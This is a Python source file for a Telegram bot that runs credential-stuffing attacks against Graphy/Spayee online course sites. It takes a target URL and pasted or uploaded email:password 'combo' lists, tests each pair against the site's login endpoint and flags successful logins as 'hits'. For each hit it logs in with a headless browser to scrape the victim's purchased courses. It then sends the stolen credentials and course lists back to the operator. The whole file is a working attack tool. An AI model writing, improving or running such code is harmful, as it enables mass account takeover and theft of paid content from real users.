import os
import re
import asyncio
import aiohttp
import traceback
from yarl import URL

# --- Heroku / Python 3.10+ Asyncio Event Loop Fix for Pyrogram ---
try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
# -----------------------------------------------------------------

from pyrogram import Client, filters
from pyrogram.types import Message

# Playwright import
try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False
    print("[WARN] Playwright not installed. Course extraction disabled. Run: pip install playwright && playwright install chromium")

# Native Ask System (No pyromod dependency)
WAITING_MESSAGES = {}

async def hacker_ask(client, chat_id, text, timeout=60):
    await client.send_message(chat_id, text)
    future = asyncio.get_event_loop().create_future()
    WAITING_MESSAGES[chat_id] = future
    try:
         reply = await asyncio.wait_for(future, timeout)
         return reply
    finally:
         WAITING_MESSAGES.pop(chat_id, None)

# Env Variables
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

app = Client(
    "GraphyCheckerBot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

CHECKER_RUNNING = {}

# ============================
# PLAYWRIGHT COURSE EXTRACTOR
# ============================
async def extract_courses_playwright(base_url, email, password):
    """Login via headless browser and scrape courses from rendered DOM"""
    courses = []
    if not PLAYWRIGHT_AVAILABLE:
        return courses
    
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
            )
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
            )
            page = await context.new_page()
            
            # Step 1: Navigate to login page
            await page.goto(f"https://{base_url}/t/public/login", wait_until="networkidle", timeout=30000)
            await asyncio.sleep(2)
            
            # Step 2: Click "Continue with email" if present
            try:
                email_btn = page.get_by_text("Continue with email")
                if await email_btn.is_visible(timeout=3000):
                    await email_btn.click()
                    await asyncio.sleep(1)
            except:
                pass
            
            # Step 3: Fill login form
            try:
                # Try multiple selectors for email
                email_input = page.locator('input[type="email"], input[name="email"], input[placeholder*="email" i], input[placeholder*="Email"]').first
                pass_input = page.locator('input[type="password"], input[name="password"]').first
                
                await email_input.fill(email)
                await asyncio.sleep(0.5)
                await pass_input.fill(password)
                await asyncio.sleep(0.5)
                
                # Click submit button
                submit_btn = page.locator('button[type="submit"], button:has-text("Next"), button:has-text("Sign in"), button:has-text("Login"), button:has-text("Log in")').first
                await submit_btn.click()
            except:
                # Fallback: Direct POST login via page navigation
                await page.goto(
                    f"https://{base_url}/s/authenticate",
                    wait_until="networkidle",
                    timeout=30000
                )
            
            # Step 4: Wait for redirect to courses page
            await asyncio.sleep(5)
            
            # Step 5: Navigate to mycourses / activeCourses
            try:
                await page.goto(f"https://{base_url}/t/u/activeCourses", wait_until="networkidle", timeout=30000)
                await asyncio.sleep(5)
            except:
                try:
                    await page.goto(f"https://{base_url}/s/mycourses", wait_until="networkidle", timeout=30000)
                    await asyncio.sleep(5)
                except:
                    pass
            
            # Step 6: Extract course names from rendered DOM
            # Multiple selector strategies for universal compatibility
            selectors = [
                # New Graphy Spectre UI
                '[class*="course-card"] [class*="title"]',
                '[class*="courseCard"] [class*="title"]',
                '[class*="course"] h3',
                '[class*="course"] h4',
                '[class*="course-name"]',
                '[class*="courseName"]',
                # Generic card patterns
                '.card h3', '.card h4',
                '.card-title',
                '[class*="card"] [class*="title"]',
                # Spayee classic
                '.scourse .card-title',
                '.course-title',
                # Fallback: any h3/h4 inside main content
                'main h3', 'main h4',
                '#root h3', '#root h4',
                '[class*="active"] h3',
            ]
            
            for selector in selectors:
                try:
                    elements = await page.locator(selector).all()
                    for el in elements:
                        text = (await el.text_content() or "").strip()
                        if text and len(text) > 3 and len(text) < 200:
                            courses.append(text)
                except:
                    pass
                
                if courses:
                    break
            
            # Step 7: Fallback - get ALL visible text and find course-like entries
            if not courses:
                try:
                    body_text = await page.inner_text('body')
                    # Look for lines that look like course names (capitalized, specific length)
                    lines = body_text.split('\n')
                    for line in lines:
                        line = line.strip()
                        if 10 < len(line) < 150 and not line.startswith(('http', 'www', '<', '{', '[')):
                            if any(kw in line.lower() for kw in ['module', 'batch', 'course', 'class', 'recording', 'prelim', 'mains', 'lecture', 'session', 'collection', 'foundation', 'advanced', 'live']):
                                courses.append(line)
                except:
                    pass
            
            await browser.close()
    except Exception as e:
        print(f"[PW ERROR] {e}")
        traceback.print_exc()
    
    # Clean & deduplicate
    clean = []
    seen = set()
    blacklist = ['my courses', 'home', 'explore', 'store', 'profile', 'logo', 'icon', 'graphy', 'sign out', 'log out', 'settings']
    for c in courses:
        c = c.strip()
        if c.lower() not in blacklist and c not in seen and len(c) > 3:
            seen.add(c)
            clean.append(c)
    return clean

# ============================
# FAST LOGIN CHECKER (aiohttp)
# ============================
async def check_graphy_account(base_url, email, password):
    login_url = f"https://{base_url}/s/authenticate"
    
    payload = {
        "email": email,
        "password": password,
        "age": "",
        "url": "/"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"https://{base_url}",
        "Referer": f"https://{base_url}/t/public/login?signup",
        "Upgrade-Insecure-Requests": "1"
    }

    timeout = aiohttp.ClientTimeout(total=45, connect=30, sock_read=30)
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, limit=10), timeout=timeout) as session:
        try:
            # Step 1: Login with retry
            resp = None
            for attempt in range(3):
                try:
                    resp = await session.post(login_url, data=payload, headers=headers, allow_redirects=False)
                    break
                except (asyncio.TimeoutError, aiohttp.ClientError):
                    if attempt == 2:
                        raise
                    await asyncio.sleep(2)
            
            if resp is None:
                return {"status": "error"}
                
            cookies = session.cookie_jar.filter_cookies(URL(login_url))
            location = resp.headers.get("Location", "")
            
            is_hit = False
            if 'c_ujwt' in cookies:
                is_hit = True
            elif resp.status in [301, 302, 303] and "login" not in location.lower() and "error" not in location.lower():
                is_hit = True

            if not is_hit:
                return {"status": "bad"}

            # Step 2: HIT confirmed - Extract courses via Playwright
            courses = await extract_courses_playwright(base_url, email, password)
            
            return {
                "status": "hit", 
                "email": email, 
                "password": password, 
                "courses": courses if courses else ["Login Valid - Course Parse Pending"]
            }
                
        except Exception as e:
            print(f"[ERROR] {email} -> {base_url}: {e}")
            traceback.print_exc()
            return {"status": "error"}

# ============================
# TELEGRAM BOT HANDLERS
# ============================
@app.on_message(filters.command("start"))
async def start_cmd(client: Client, message: Message):
    await message.reply(
        "**Graphy Universal Checker Bot**\n\n"
        "**Commands:**\n"
        "/graphy - Start checker\n"
        "/stop_graphy - Stop active check\n\n"
        "Supports ALL Graphy/Spayee platforms.\n"
        "Courses extracted via headless browser."
    )

@app.on_message(~filters.command(["graphy", "start", "stop_graphy"]))
async def catch_replies(client: Client, message: Message):
    chat_id = message.chat.id
    if chat_id in WAITING_MESSAGES and not WAITING_MESSAGES[chat_id].done():
        WAITING_MESSAGES[chat_id].set_result(message)

@app.on_message(filters.command("graphy"))
async def graphy_cmd(client: Client, message: Message):
    chat_id = message.chat.id
    
    # Phase 1: Get Base URL
    try:
        url_ask = await hacker_ask(client, chat_id, 
            "**SEND GRAPHY BASE URL**\n\nExample: `learn.rodha.co.in`\n\n_Type /cancel to abort._", timeout=60)
        if url_ask.text.lower() == '/cancel':
            return await message.reply("Cancelled.")
        base_url = url_ask.text.strip().replace("https://", "").replace("http://", "").split("/")[0]
    except:
        return await message.reply("Request timed out.")

    # Phase 2: Get Combos
    try:
        combo_ask = await hacker_ask(client, chat_id, 
            "**Send Combo File (.txt) or Paste Combos (email:pass)**\n\n_Type /cancel to abort._", timeout=120)
        if combo_ask.text and combo_ask.text.lower() == '/cancel':
            return await message.reply("Cancelled.")
            
        combos = []
        if combo_ask.document:
            file_path = await combo_ask.download()
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                combos = f.read().splitlines()
            os.remove(file_path)
        elif combo_ask.text:
            combos = combo_ask.text.splitlines()
    except:
        return await message.reply("Request timed out or file error.")

    valid_combos = []
    for line in combos:
        if ":" in line:
            parts = line.split(":", 1)
            valid_combos.append((parts[0].strip(), parts[1].strip()))

    total = len(valid_combos)
    if total == 0:
        return await message.reply("No valid combos. Use `email:password` format.")

    await message.reply(f"**Firing Universal Graphy Engine**\nTarget: `{base_url}`\nCombos: `{total}`")
    
    CHECKER_RUNNING[chat_id] = True
    msg = await message.reply("Starting... 0%")
    
    hits = []
    bad = 0
    errors = 0
    checked = 0
    hit_file = f"Graphy_Hits_{base_url}.txt"
    
    # Semaphore: Keep low (3) because Playwright is heavy
    sem = asyncio.Semaphore(3) 
    
    async def worker(email, password):
        nonlocal checked, bad, errors
        if not CHECKER_RUNNING.get(chat_id, False):
            return
            
        async with sem:
            res = await check_graphy_account(base_url, email, password)
            if res["status"] == "hit":
                hits.append(res)
                courses_str = " | ".join(res["courses"])
                
                hit_text = f"Email: {res['email']}\nPass: {res['password']}\nCourses: {courses_str}\nTarget: {base_url}\n{'-'*30}\n"
                with open(hit_file, "a", encoding="utf-8") as f:
                    f.write(hit_text)
                
                await client.send_message(chat_id, 
                    f"**HIT FOUND**\n\n"
                    f"Email: `{res['email']}`\n"
                    f"Pass: `{res['password']}`\n"
                    f"Courses: `{courses_str}`\n"
                    f"Target: `{base_url}`")
                
            elif res["status"] == "bad":
                bad += 1
            else:
                errors += 1
                
            checked += 1

    tasks = [worker(e, p) for (e, p) in valid_combos]
    
    async def updater():
        while checked < total and CHECKER_RUNNING.get(chat_id, False):
            try:
                progress = (
                    f"**GRAPHY CHECK LIVE**\n\n"
                    f"Target: `{base_url}`\n"
                    f"Hits: `{len(hits)}`\n"
                    f"Bads: `{bad}`\n"
                    f"Errors: `{errors}`\n"
                    f"Checked: `{checked}/{total}`"
                )
                await msg.edit_text(progress)
            except:
                pass
            await asyncio.sleep(5)
            
    updater_task = asyncio.create_task(updater())
    await asyncio.gather(*tasks)
    updater_task.cancel()
    
    final_text = (
        f"**GRAPHY CHECK COMPLETED**\n\n"
        f"Target: `{base_url}`\n"
        f"Total Hits: `{len(hits)}`\n"
        f"Bads: `{bad}`\n"
        f"Errors: `{errors}`\n"
        f"Processed: `{total}/{total}`"
    )
    try:
        await msg.edit_text(final_text)
    except:
        await message.reply(final_text)
    
    if len(hits) > 0:
        await message.reply_document(hit_file, caption=f"Hits for {base_url}")
    if os.path.exists(hit_file):
        os.remove(hit_file)

@app.on_message(filters.command("stop_graphy"))
async def stop_checker(client, message):
    chat_id = message.chat.id
    if CHECKER_RUNNING.get(chat_id):
        CHECKER_RUNNING[chat_id] = False
        await message.reply("Stopping checker...")
    else:
        await message.reply("No active check found.")

if __name__ == "__main__":
    if not API_ID or not API_HASH or not BOT_TOKEN:
        print("ERROR: Set API_ID, API_HASH, BOT_TOKEN env vars!")
    else:
        print("Starting Universal Graphy Bot (Playwright Edition)...")
        app.run()
